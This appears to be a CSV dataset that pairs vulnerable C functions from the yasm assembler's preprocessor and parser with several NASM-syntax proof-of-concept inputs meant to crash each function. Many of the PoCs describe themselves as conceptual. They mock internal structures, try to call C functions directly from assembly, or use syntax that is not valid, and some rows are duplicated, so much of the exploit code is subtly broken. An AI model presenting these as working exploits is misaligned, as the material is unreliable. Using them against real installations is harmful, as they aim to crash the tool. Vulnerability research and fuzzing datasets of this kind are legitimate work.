Vulnerable Code,PoC Exploit Code,Vul_Index
"expand_mmac_params(Token * tline) { Token *t, *tt, **tail, *thead; tail = &thead; thead = NULL; while (tline) { if (tline->type == TOK_PREPROC_ID && (((tline->text[1] == '+' || tline->text[1] == '-') && tline->text[2]) || tline->text[1] == '%' || (tline->text[1] >= '0' && tline->text[1] <= '9'))) { char *text = NULL; int type = 0, cc; char tmpbuf[30]; char *second_text = NULL; int n, i; MMacro *mac; t = tline; tline = tline->next; second_text = strchr(t->text, ':'); mac = istk->mstk; while (mac && !mac->name) mac = mac->next_active; if (!mac) error(ERR_NONFATAL, '`%s': not in a macro call', t->text); else { if (second_text) { int end = atoi(second_text+1)-1; int is_fst = 1; int k; n = atoi(t->text + 1)-1; if (end < 0) end += mac->nparam; for (k = n; k <= end; k++) { if (k >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) k = (k + mac->rotate) % mac->nparam; tt = mac->params[k]; } if (tt) { if (!is_fst && mac->paramlen[k]) { *tail = new_Token(NULL, TOK_OTHER, ',', 0); tail = &(*tail)->next; } if (mac->paramlen[k]) is_fst = 0; for (i = 0; i < mac->paramlen[k]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; } } else { switch (t->text[1]) { case '0': type = TOK_NUMBER; sprintf(tmpbuf, '%ld', mac->nparam); text = nasm_strdup(tmpbuf); break; case '%': type = TOK_ID; sprintf(tmpbuf, '..@%lu.', mac->unique); text = nasm_strcat(tmpbuf, t->text + 2); break; case '-': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; if (inverse_ccs[cc] == -1) { error(ERR_NONFATAL, 'condition code `%s' is not invertible', conditions[cc]); text = NULL; } else text = nasm_strdup(conditions[inverse_ccs [cc]]); } break; case '+': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; text = nasm_strdup(conditions[cc]); } break; default: n = atoi(t->text + 1) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } if (tt) { for (i = 0; i < mac->paramlen[n]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; } } } if (!text) { delete_Token(t); } else { *tail = t; tail = &t->next; t->type = type; nasm_free(t->text); t->text = text; t->mac = NULL; } continue; } else { t = *tail = tline; tline = tline->next; t->mac = NULL; tail = &t->next; } } *tail = NULL; t = thead; for (; t && (tt = t->next) != NULL; t = t->next) switch (t->type) { case TOK_WHITESPACE: if (tt->type == TOK_WHITESPACE) { t->next = delete_Token(tt); } break; case TOK_ID: if (tt->type == TOK_ID || tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; case TOK_NUMBER: if (tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; } return thead; }","%macro trigger_expand_mmac_params 0
    %define %+1 1
    %rep 1000000
        %+1 %+1 %+1 %+1 %+1 %+1 %+1 %+1 %+1 %+1
    %endrep
%endmacro

%macro setup_invalid_macro 0
    %define %$param1 %+1
    %assign %$param2 (%+1 %+1)
    %assign %$param3 (%+1 %+1 %+1)
%endmacro

%macro misuse_token 0
    %define %$token1 %+1
    %define %$token2 %+1 %+1
    %define %$token3 %+1 %+1 %+1
%endmacro

trigger_expand_mmac_params
setup_invalid_macro
misuse_token",vul23_1
,"%macro crash_yasm 0
    %rep 1000000  ; Large number to potentially exhaust stack or cause unexpected behavior
        %define %+1 %+1  ; Recursive expansion to increase complexity and potential for error
    %endrep
    %+1: %+1  ; Use of token concatenation and label to trigger parsing errors
%endmacro

%macro misuse_params 0
    %define %$param1 1
    %define %$param2 -1  ; Negative index to test bounds checking
    %define %$param3 %0  ; Non-existent parameter reference
    %define %$param4 %+1  ; Invalid token concatenation
    %define %$param5 %$param1+%$param2  ; Arithmetic on parameters
    misuse_params %+1, %$param5, %$param3  ; Misuse macro parameters in call
%endmacro

crash_yasm
misuse_params",vul23_2
,"%macro crash_macro 1
    %1: %+1
%endmacro

%define %+ wrap_around
crash_macro %+999999999",vul23_3
,"%macro crash_yasm 0
    %define %$tline 1
    %assign %$t.type TOK_PREPROC_ID
    %define %$t.text ""+1:5""
    %assign %$t.next 0

    ; Simulate a macro call environment
    %define %$mac.name 1
    %assign %$mac.nparam 3
    %assign %$mac.rotate 1
    %assign %$mac.params {1, 2, 3}
    %assign %$mac.paramlen {1, 1, 1}

    ; Trigger the vulnerable function with crafted tokens
    expand_mmac_params %$tline
%endmacro

crash_yasm",vul23_4
"static int handle_dot_label(YYSTYPE *lvalp, char *tok, size_t toklen, size_t zeropos, yasm_parser_nasm *parser_nasm) { /* check for special non-local labels like ..start */ if (tok[zeropos+1] == '.') { lvalp->str_val = yasm__xstrndup(tok+zeropos+(parser_nasm->tasm?2:0), toklen-zeropos-(parser_nasm->tasm?2:0)); /* check for special non-local ..@label */ if (lvalp->str_val[2] == '@') return NONLOCAL_ID; return SPECIAL_ID; } if (parser_nasm->masm && tok[zeropos] == '.') { lvalp->str_val = yasm__xstrndup(tok + zeropos, toklen - zeropos); return SPECIAL_ID; } if (parser_nasm->tasm && (!tasm_locals || (tok[zeropos] == '.' && tok[zeropos+1] != '@' && tok[zeropos+2] != '@'))) { /* no locals on Tasm without the 'locals' directive */ /* .foo is never local either, but .@@foo may be (local structure members) */ lvalp->str_val = yasm__xstrndup(tok + zeropos, toklen - zeropos); return SPECIAL_ID; } if (!parser_nasm->locallabel_base) { lvalp->str_val = yasm__xstrndup(tok+zeropos, toklen-zeropos); yasm_warn_set(YASM_WARN_GENERAL, N_(\""no non-local label before `%s'\""), lvalp->str_val); } else { size_t len = toklen - zeropos + parser_nasm->locallabel_base_len; lvalp->str_val = yasm_xmalloc(len + 1); strcpy(lvalp->str_val, parser_nasm->locallabel_base); strncat(lvalp->str_val, tok+zeropos, toklen-zeropos); lvalp->str_val[len] = '\\0'; } return LOCAL_ID; }","%macro trigger_handle_dot_label 0
    ; Simulate a scenario where the token length is less than expected for safe access
    ; We will pass a token with length 1, which should not allow access to str_val[2]
    ; This is a conceptual representation and may need actual C code interaction or specific crafted input file to trigger in practice

    ; Define a minimal token and manipulate the internal state to pass to handle_dot_label
    %define tok "".""
    %define toklen 1
    %define zeropos 0
    %define parser_nasm.tasm 0

    ; Directly manipulate memory assuming we can interact at this level (conceptual)
    ; The real trigger would need to be done via crafted input or direct memory manipulation in a testing environment
    %assign lvalp 0x1000  ; hypothetical address
    %assign lvalp.str_val 0x1004  ; hypothetical address pointing to str_val

    ; Place a short string at lvalp.str_val
    db '.', 0  ; simulate that str_val points here, which is less than 3 characters long

    ; The following line is conceptual and would typically be triggered by the parser handling a crafted input
    ; handle_dot_label(lvalp, tok, toklen, zeropos, parser_nasm)
%endmacro

trigger_handle_dot_label",vul24_1
,"%macro trigger_handle_dot_label 0
    ; Simulate a scenario where the tok string is shorter than expected
    ; causing an out-of-bounds access when the function tries to access lvalp->str_val[2]
    struc simulate_short_tok
        .byte 1 dup(0)  ; Only one byte, making toklen effectively 1
    endstruc

    ; Define a macro to create an instance of simulate_short_tok
    %define tok simulate_short_tok
    %define zeropos 0
    %define toklen 1
    %define parser_nasm.tasm 0

    ; This should trigger the function with controlled parameters
    %assign lvalp_str_val_offset 2
    %assign lvalp_str_val [lvalp_str_val_offset]

    ; Attempt to access an out-of-bounds index
    mov eax, [lvalp_str_val]
%endmacro

; Use the macro to trigger the vulnerability
trigger_handle_dot_label",vul24_2
,"%macro trigger_out_of_bounds_read 0
struc trigger
    .tok db '.', '.', 0       ; Construct a token that looks like a special non-local label but is only 2 characters long
    .toklen equ $ - .tok      ; Calculate the length of the token
    .zeropos equ 0            ; Zero position at the start
    .parser_nasm dd 0         ; Mock structure for parser_nasm with tasm set to false
    .lvalp dd 0               ; Mock structure for YYSTYPE
endstruc

%assign %$parser_nasm_tasm_offset 4 ; Assuming 'tasm' is at offset 4 in parser_nasm structure
%assign %$lvalp_str_val_offset 0    ; Assuming 'str_val' is at offset 0 in YYSTYPE structure

; Simulate the environment and conditions to reach the vulnerable line
mov eax, [trigger.parser_nasm]      ; Load the address of parser_nasm
mov byte [eax+%$parser_nasm_tasm_offset], 0 ; Ensure 'tasm' is false

mov ebx, [trigger.lvalp]            ; Load the address of lvalp
mov ecx, trigger.tok                ; Load the address of the token
mov edx, trigger.toklen             ; Load the token length
mov esi, trigger.zeropos            ; Load the zero position

; Call the function (simulated) with controlled parameters
; Assuming handle_dot_label is at some known address or label
call handle_dot_label, ebx, ecx, edx, esi, eax

%endmacro

trigger_out_of_bounds_read",vul24_3
,"%macro crash_handle_dot_label 0
    ;; Simulate a scenario where the input token is too short, leading to an out-of-bounds access
    ;; when the function tries to access lvalp->str_val[2].
    ;; We assume that the function is called with tok = ""."", toklen = 1, zeropos = 0.
    ;; This should lead to an allocation of str_val with insufficient length.
    struc simulate_short_input
        .byte 1 dup('.')
    endstruc

    ;; Trigger the parsing that would invoke handle_dot_label with the crafted input.
    simulate_short_input
%endmacro

crash_handle_dot_label",vul24_4
,"%macro crash_handle_dot_label 0
    ; Trigger an out-of-bounds read by manipulating the token length and zero position
    ; Assume zeropos is manipulated to be at the end of a short token, causing str_val to be shorter than 3 characters
    struc trigger_dot_label
        .byte 1, '.', 'a' ; a short token with a dot but less than 3 characters after the dot
    endstruc

    %assign %$zeropos 1 ; simulate the position just after the dot
    %assign %$toklen 2  ; simulate the total length of the token as 2

    ; Directly invoke the problematic function with controlled parameters
    ; This is a conceptual call, as we cannot directly call C functions from NASM without proper setup
    ; In a real scenario, this would be set up to pass the controlled 'tok', 'toklen', and 'zeropos' to 'handle_dot_label'
    handle_dot_label .trigger_dot_label, %$zeropos, %$toklen, yasm_parser_nasm
%endmacro

crash_handle_dot_label",vul24_5
,"%define simulate_input
struc input_instance
    .lvalp resb 8        ; Reserve space for pointer (simulate YYSTYPE*)
    .tok resb 10         ; Reserve 10 bytes for token input
    .toklen resd 1       ; Token length (4 bytes)
    .zeropos resd 1      ; Zero position (4 bytes)
    .parser_nasm resb 8  ; Reserve space for parser_nasm pointer
endstruc

section .data
input db ""....@"", 5      ; Input token with potential out-of-bounds access
parser_nasm db 0         ; Dummy parser_nasm structure

section .bss
instance resb input_instance_size

section .text
    mov [instance.input_instance.tok], offset input
    mov dword [instance.input_instance.toklen], 5
    mov dword [instance.input_instance.zeropos], 3  ; Set zeropos to trigger out-of-bounds
    mov [instance.input_instance.parser_nasm], offset parser_nasm

    ; Simulate calling handle_dot_label
    ; Parameters (simulated): lvalp, tok, toklen, zeropos, parser_nasm
    ; Directly manipulate memory to trigger the vulnerability
    mov rdi, [instance.input_instance.lvalp]       ; Load address of lvalp
    mov rsi, [instance.input_instance.tok]         ; Load address of tok
    mov edx, [instance.input_instance.toklen]      ; Load toklen
    mov ecx, [instance.input_instance.zeropos]     ; Load zeropos
    mov r8, [instance.input_instance.parser_nasm]  ; Load parser_nasm

    ; The following call is conceptual and represents the vulnerability trigger point
    ; In practice, this would require an environment where handle_dot_label is callable
    ; call handle_dot_label",vul24_6
"do_directive(Token * tline) { int i, j, k, m, nparam, nolist; int offset; char *p, *mname, *newname; Include *inc; Context *ctx; Cond *cond; SMacro *smac, **smhead; MMacro *mmac; Token *t, *tt, *param_start, *macro_start, *last, **tptr, *origline; Line *l; struct tokenval tokval; yasm_expr *evalresult; MMacro *tmp_defining; yasm_intnum *intn; origline = tline; skip_white_(tline); if (!tok_type_(tline, TOK_PREPROC_ID) || (tline->text[1] == '%' || tline->text[1] == '$' || tline->text[1] == '!')) return NO_DIRECTIVE_FOUND; i = -1; j = elements(directives); while (j - i > 1) { k = (j + i) / 2; m = nasm_stricmp(tline->text, directives[k]); if (m == 0) { if (tasm_compatible_mode) { i = k; j = -2; } else if (k != PP_ARG && k != PP_LOCAL && k != PP_STACKSIZE) { i = k; j = -2; } break; } else if (m < 0) { j = k; } else i = k; } if (((istk->conds && !emitting(istk->conds->state)) || (istk->mstk && !istk->mstk->in_progress)) && !is_condition(i)) { return NO_DIRECTIVE_FOUND; } if (defining && i != PP_MACRO && i != PP_IMACRO && i != PP_ENDMACRO && i != PP_ENDM && (defining->name || (i != PP_ENDREP && i != PP_REP))) { return NO_DIRECTIVE_FOUND; } if (defining) { if (i == PP_MACRO || i == PP_IMACRO) { nested_mac_count++; return NO_DIRECTIVE_FOUND; } else if (nested_mac_count > 0) { if (i == PP_ENDMACRO) { nested_mac_count--; return NO_DIRECTIVE_FOUND; } } if (!defining->name) { if (i == PP_REP) { nested_rep_count++; return NO_DIRECTIVE_FOUND; } else if (nested_rep_count > 0) { if (i == PP_ENDREP) { nested_rep_count--; return NO_DIRECTIVE_FOUND; } } } } if (j != -2) { error(ERR_NONFATAL, \""unknown preprocessor directive `%s'\"", tline->text); return NO_DIRECTIVE_FOUND; } switch (i) { case PP_STACKSIZE: tline = tline->next; if (tline && tline->type == TOK_WHITESPACE) tline = tline->next; if (!tline || tline->type != TOK_ID) { error(ERR_NONFATAL, \""`%%stacksize' missing size parameter\""); free_tlist(origline); return DIRECTIVE_FOUND; } if (nasm_stricmp(tline->text, \""flat\"") == 0) { StackSize = 4; StackPointer = \""ebp\""; ArgOffset = 8; LocalOffset = 4; } else if (nasm_stricmp(tline->text, \""large\"") == 0) { StackSize = 2; StackPointer = \""bp\""; ArgOffset = 4; LocalOffset = 2; } else if (nasm_stricmp(tline->text, \""small\"") == 0) { StackSize = 2; StackPointer = \""bp\""; ArgOffset = 6; LocalOffset = 2; } else { error(ERR_NONFATAL, \""`%%stacksize' invalid size type\""); free_tlist(origline); return DIRECTIVE_FOUND; } free_tlist(origline); return DIRECTIVE_FOUND; case PP_INCLUDE: tline = tline->next; skip_white_(tline); if (!tline || (tline->type != TOK_STRING && tline->type != TOK_INTERNAL_STRING)) { error(ERR_NONFATAL, \""`%%include' expects a file name\""); free_tlist(origline); return DIRECTIVE_FOUND; } if (tline->next) error(ERR_WARNING, \""trailing garbage after `%%include' ignored\""); if (tline->type != TOK_INTERNAL_STRING) { p = tline->text + 1; p[strlen(p) - 1] = '\\0'; } else p = tline->text; expand_macros_in_string(&p); inc = nasm_malloc(sizeof(Include)); inc->next = istk; inc->conds = NULL; inc->fp = inc_fopen(p, &newname); nasm_free(p); inc->fname = nasm_src_set_fname(newname); inc->lineno = nasm_src_set_linnum(0); inc->lineinc = 1; inc->expansion = NULL; inc->mstk = NULL; istk = inc; list->uplevel(LIST_INCLUDE); free_tlist(origline); return DIRECTIVE_FOUND; case PP_STRLEN: tline = tline->next; skip_white_(tline); tline = expand_id(tline); if (!tline || (tline->type != TOK_ID && (tline->type != TOK_PREPROC_ID || tline->text[1] != '$'))) { error(ERR_NONFATAL, \""`%%strlen' expects a macro identifier as first parameter\""); free_tlist(origline); return DIRECTIVE_FOUND; } ctx = get_ctx(tline->text, FALSE); if (!ctx) smhead = &smacros[hash(tline->text)]; else smhead = &ctx->localmac; mname = tline->text; last = tline; tline = expand_smacro(tline->next); last->next = NULL; t = tline; while (tok_type_(t, TOK_WHITESPACE)) t = t->next; if (t->type != TOK_STRING) { error(ERR_NONFATAL, \""`%%strlen` requires string as second parameter\""); free_tlist(tline); free_tlist(origline); return DIRECTIVE_FOUND; } macro_start = nasm_malloc(sizeof(*macro_start)); macro_start->next = NULL; make_tok_num(macro_start, yasm_intnum_create_uint((unsigned long)(strlen(t->text) - 2))); macro_start->mac = NULL; if (smacro_defined(ctx, mname, 0, &smac, i == PP_STRLEN)) { if (!smac) error(ERR_WARNING, \""single-line macro `%s' defined both with and without parameters\"", mname); else { nasm_free(smac->name); free_tlist(smac->expansion); } } else { smac = nasm_malloc(sizeof(SMacro)); smac->next = *smhead; *smhead = smac; } smac->name = nasm_strdup(mname); smac->casesense = (i == PP_STRLEN); smac->nparam = 0; smac->level = 0; smac->expansion = macro_start; smac->in_progress = FALSE; free_tlist(tline); free_tlist(origline); return DIRECTIVE_FOUND;","%macro crash_strlen 0
    ; Simulate a scenario where the token type is not TOK_STRING but is processed as if it were.
    ; This will exploit the check `if (t->type != TOK_STRING)` in the `PP_STRLEN` directive handling.

    ; Define a token that mimics a string but is actually a different type, causing a type confusion.
    %define TOK_STRING 999  ; Redefine TOK_STRING to an unexpected value
    %define TOK_ID 1        ; Ensure TOK_ID is defined as it should be

    ; Create a fake token stream where the token type is TOK_ID but the content looks like a string.
    %strcat %1 ""fake_string""  ; Use strcat to create a string-like token
    %assign %1.type TOK_ID    ; Mislabel the token type to cause type confusion

    ; Trigger the directive processing with the malformed token.
    %strlen %1  ; This should trigger the processing of a string length directive with a malformed token
%endmacro

; Invoke the macro to simulate the exploit scenario.
crash_strlen",vul25_1
,"%macro malicious_macro 0
    %define %$fake_string 12345
%endmacro

%macro trigger_strlen 0
    %strlen %$fake_string
%endmacro

malicious_macro
trigger_strlen",vul25_2
,"%macro trigger_strlen_error 0
    %define %$fake_string TOK_ID  ; Misleading macro, looks like a string but declared as TOK_ID
    %assign %$token_type %$fake_string
    %%invoke_strlen:
        %strlen %$token_type ""fake_string""  ; Intentionally incorrect usage
%endmacro

trigger_strlen_error",vul25_3
,"%macro malicious_macro 0
    %define tricky_token `1234`  ; Initially looks like a number
%endmacro

%define %$local_var tricky_token
%assign %$local_var %$local_var %+ %$local_var  ; Force an expansion that results in a non-string

%macro trigger_crash 0
    %%strlen %$local_var  ; This should expand and then be misinterpreted
%endmacro

trigger_crash",vul25_4
,"%macro trigger_strlen_misuse 0
    %define %$str ""dummy""
    %assign %$type TOK_ID  ; Intentionally wrong type to bypass TOK_STRING check
    %%start:
        %strlen %$str  ; This should be a macro identifier but is misused here
%endmacro

trigger_strlen_misuse",vul25_5
,"%macro malicious_macro 0
    db ""This is not a string token"", 0
%endmacro

%define %$local_var malicious_macro
%strlen %$local_var",vul25_6
,"%macro malicious_macro 0
    %define %$fake_string 12345
%endmacro

%macro trigger_strlen 0
    %strlen %$fake_string
%endmacro

malicious_macro
trigger_strlen",vul25_7
,"%macro trigger_string_type_mismatch 0
    struc fake_token
        .type resb 1      ; Reserve space for token type
        .text resb 10     ; Reserve space for token text
    endstruc

    section .data
    fake_token_start:
        db TOK_ID         ; Incorrect token type for PP_STRLEN
        db 'fake', 0      ; Some text that is not a valid string for PP_STRLEN

    %define tline fake_token_start

    ; Simulate calling do_directive with a malformed token list
    %xdefine PP_STRLEN 1   ; Assuming PP_STRLEN is defined as 1 for demonstration
    %assign i PP_STRLEN
    %ifidn i, PP_STRLEN
        ; This block simulates the internal logic of do_directive handling PP_STRLEN
        %if tline.type != TOK_STRING
            db 0x00       ; Intentionally place an invalid operation to trigger a crash
        %endif
    %endif
%endmacro

trigger_string_type_mismatch",vul25_8
,"%macro trigger_strlen_mismatch 0
    %define strange_token `12345`  ; Define a token that is not a string
    %strlen %$strange_token        ; Attempt to use %strlen on a non-string token
%endmacro

trigger_strlen_mismatch",vul25_9
,"%macro tricky_macro 0
    %define %$str ""dummy""
    %xdefine %$str %1  ; Redefine to non-string
%endmacro

%tricky_macro 12345  ; Pass a number instead of a string

%strlen %$str        ; This should pass the initial check but fail later",vul25_10
"static int hash(char *s) { unsigned int h = 0; unsigned int i = 0; static const int multipliers[] = { 1, 3, 9, 27, 19, 26, 16, 17, 20, 29, 25, 13, 8, 24, 10, 30, 28, 22, 4, 12, 5, 15, 14, 11, 2, 6, 18, 23, 7, 21 }; while (*s) { h += multipliers[i] * (unsigned char)(toupper(*s)); s++; if (++i >= sizeof(multipliers) / sizeof(multipliers[0])) i = 0; } h %= NHASH; return h; }","%macro crash_hash_function 0
    struc trigger_hash_overflow
        .data resb 31 ; Reserve 31 bytes, one more than the multipliers array
    endstruc

    %assign i 0
    %rep 31  ; Repeat 31 times to ensure we exceed the multipliers array length
        db 'A'  ; Fill with 'A' to keep it simple and predictable
        %rotate 1
    %endrep
    db 0  ; Null-terminate the string

    %define test_string trigger_hash_overflow

    ; Simulate calling the hash function with the overly long string
    ; Normally, we would need to set up a call to the actual function, but since we're focusing on the PoC for crashing,
    ; we assume here that the function will be called with 'test_string' as an argument.
%endmacro

crash_hash_function",vul26_1
,"section .text
%define long_string 0x4141414141414141, 0x4141414141414141, 0x4141414141414141, 0x4141414141414141, 0x4141414141414141, 0x4141414141414141, 0x4141414141414141, 0x4141414141414141, 0x4141414141414141, 0x4141414141414141

%macro crash_hash 0
    lea rdi, [long_string]
    call hash
%endmacro

crash_hash",vul26_2
,"%macro crash_hash 0
    struc trigger_overflow
        .data resb 1
    endstruc

    %assign %$index 31  ; Set index to one past the end of multipliers array
    %define %$string ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA""  ; 32 'A's to overflow 'i'

    %rep 32  ; Repeat enough times to ensure 'i' wraps around improperly
        db %$string
    %endrep
%endmacro

crash_hash",vul26_3
,"%macro crash_hash_function 0
struc trigger_overflow
    .data resb 40 ; Reserve 40 bytes, more than the length of multipliers array
endstruc

section .data
    overflow_string db ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"", 0

section .text
    %assign i 0
    %rep 40 ; Repeat to ensure we exceed the multipliers array
        db overflow_string[i]
        %assign i i+1
    %endrep
%endmacro

crash_hash_function",vul26_4
,"%macro crash_hash 0
    ; Define a very long string without null termination
    %assign %$i 0
    %rep 40  ; More than the length of multipliers array
        db 'A'
        %assign %$i %$i+1
    %endrep
    ; No db 0 at the end, string is not null-terminated

    ; Pass the string to a hypothetical function that uses hash
    ; Assuming there's a function that takes a string and passes it to hash
    ; This part is abstract, as we focus on the string setup
%endmacro

crash_hash",vul26_5
"static void expr_item_copy(yasm_expr__item *dest, const yasm_expr__item *src) { dest->type = src->type; switch (src->type) { case YASM_EXPR_SYM: dest->data.sym = src->data.sym; break; case YASM_EXPR_PRECBC: dest->data.precbc = src->data.precbc; break; case YASM_EXPR_EXPR: dest->data.expn = yasm_expr__copy_except(src->data.expn, -1); break; case YASM_EXPR_INT: dest->data.intn = yasm_intnum_copy(src->data.intn); break; case YASM_EXPR_FLOAT: dest->data.flt = yasm_floatnum_copy(src->data.flt); break; case YASM_EXPR_REG: dest->data.reg = src->data.reg; break; case YASM_EXPR_SUBST: dest->data.subst = src->data.subst; break; default: break; } }","%macro create_deep_expr 1
    %assign i 0
    %rep 10000  ; Large number to ensure deep recursion
        %if i == 0
            %define expr (10)
        %else
            %define expr (expr + 10)
        %endif
        %assign i i+1
    %endrep
%endmacro

%macro trigger_overflow 0
    create_deep_expr 1
    %struc test_expr
        .type resb 1
        .data resb 8  ; Assuming 64-bit pointer size
    %endstruc

    test_expr expr
%endmacro

trigger_overflow",vul27_1
,"%macro create_deep_expr 1
    %assign i 0
    %rep %1
        %if i == 0
            %define expr (10)
        %else
            %define expr (expr + 10)
        %endif
        %assign i i+1
    %endrep
    expr
%endmacro

%define deep_expr create_deep_expr(10000)  ; Adjust the depth to increase the likelihood of a stack overflow

section .text
    ; Simulate the scenario where yasm_expr_copy is called
    ; This is a conceptual representation and may need adjustments based on actual YASM internals
    %define src deep_expr
    %define dest %empty
    %struc yasm_expr__item
        .type resb 1
        .data resb 8  ; Assuming 64-bit pointers
    %endstruc

    yasm_expr__item src
    yasm_expr__item dest

    ; Assuming yasm_expr_copy is a callable function within the context of this PoC
    ; This line is conceptual and needs to be adapted to actual usage or testing environments
    ; yasm_expr_copy dest, src",vul27_2
,"%macro create_expr 0
    struc expr
        .type resb 1
        .data resb 8  ; Reserve space for union data
    endstruc

    %assign expr_size expr_size + expr.size

    %define expr1 expr
    %define expr2 expr+expr_size
%endmacro

%macro trigger_expr_copy 0
    create_expr

    ; Simulate setting up an expression of type YASM_EXPR_EXPR
    db YASM_EXPR_EXPR  ; expr1.type = YASM_EXPR_EXPR
    dq expr2           ; expr1.data.expn points to expr2

    db YASM_EXPR_INT   ; expr2.type = YASM_EXPR_INT
    dq 0               ; expr2.data.intn = 0 (dummy integer)

    ; This should trigger the recursive copy with an invalid index
    ; Attempt to copy expr1 to expr2, which should recursively try to copy expr2 to itself
    ; with an invalid index, potentially causing a memory corruption
    %rep 1
        mov eax, [expr1]
        mov [expr2], eax
    %endrep
%endmacro

trigger_expr_copy",vul27_3
,"%macro create_deep_expr 1
    %if %1 > 0
        %define expr_%1 expr_%1-1 + expr_%1-1
        create_deep_expr %1-1
    %else
        %define expr_0 1
    %endif
%endmacro

%macro trigger_overflow 0
    struc yasm_expr__item
        .type resb 1
        .data resb 8
    endstruc

    %assign DEPTH 1000
    create_deep_expr DEPTH

    segment .data
    src_item: 
        db YASM_EXPR_EXPR ; type
        dq expr_DEPTH     ; data.expn

    dest_item:
        resb 9            ; Allocate space for dest yasm_expr__item

    %define yasm_expr__copy_except(src, n) (src+n) ; Mock function to simulate recursion

    ; Simulate the function call
    mov rdi, dest_item  ; destination
    mov rsi, src_item   ; source
    call expr_item_copy
%endmacro

trigger_overflow",vul27_4
,"%macro trigger_expr_copy_overflow 0
    struc yasm_expr__item
        .type resb 1
        .data resb 8  ; Assuming 64-bit pointer size for simplicity
    endstruc

    %assign %$depth 10000  ; Large depth to potentially cause stack overflow
    %rep %$depth
        %define expr%1 [yasm_expr__item.type=YASM_EXPR_EXPR yasm_expr__item.data=expr%1+1]
    %endrep

    %define expr%$depth [yasm_expr__item.type=YASM_EXPR_INT yasm_expr__item.data=0]  ; Terminate the recursion

    ; Simulate the call to yasm_expr_copy with a deeply nested expression
    %define src expr0
    %define dest expr_final
    yasm_expr_copy dest, src
%endmacro

trigger_expr_copy_overflow",vul27_5
,"%macro trigger_expr_copy 0
    struc yasm_expr__item
        .type resb 1
        .data resb 8  ; Assuming 64-bit pointer size
    endstruc

    ; Simulate a recursive expression structure
    %define expr_recursive %1
    %assign %1 expr_recursive + yasm_expr__item.size

    ; Allocate space for two expression items
    section .bss
    expr1 resb yasm_expr__item.size
    expr2 resb yasm_expr__item.size

    ; Setup a recursive expression in expr1
    %define expr1_type (expr1 + yasm_expr__item.type)
    %define expr1_data (expr1 + yasm_expr__item.data)
    db YASM_EXPR_EXPR  ; Expression type
    dq expr1           ; Point to itself, creating a loop

    ; Setup a normal expression in expr2
    %define expr2_type (expr2 + yasm_expr__item.type)
    %define expr2_data (expr2 + yasm_expr__item.data)
    db YASM_EXPR_INT   ; Integer type
    dq 0               ; Some integer value

    ; Trigger the copy, expecting it to handle the recursive structure
    extern yasm_expr_copy
    mov rdi, expr2     ; Destination
    mov rsi, expr1     ; Source (recursive)
    call yasm_expr_copy
%endmacro

trigger_expr_copy",vul27_6
